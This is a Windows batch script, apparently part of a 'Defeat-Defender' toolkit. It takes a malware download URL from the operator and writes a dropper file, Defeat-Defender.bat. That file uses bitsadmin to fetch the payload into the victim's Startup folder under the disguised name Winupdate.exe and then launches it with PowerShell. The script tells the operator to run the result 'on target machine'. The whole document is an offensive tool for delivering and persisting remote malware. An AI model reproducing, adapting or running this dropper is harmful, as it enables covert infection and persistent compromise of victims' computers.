@echo off

type banner.txt
color 0a
echo.
echo.
set /p a="Enter the Direct Link of malware : "
if [%a%]==[] ( 
CALL:error
pause
EXIT /B %ERRORLEVEL% 
) 
if [%a%] NEQ [] (
CALL:main
pause
EXIT /B %ERRORLEVEL% 
)
:main
echo.
echo Your  Url is :  %a% 
echo. >>Defeat-Defender.bat
echo bitsadmin /transfer Packages /download /priority foreground %a% "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" >>Defeat-Defender.bat
echo. >>Defeat-Defender.bat
echo powershell -command "start Winupdate.exe" >>Defeat-Defender.bat
echo. >>Defeat-Defender.bat
echo. >>Defeat-Defender.bat
echo.
echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
EXIT /B %ERRORLEVEL% 
:error
echo.
echo Please Enter the link And Try Again!!!
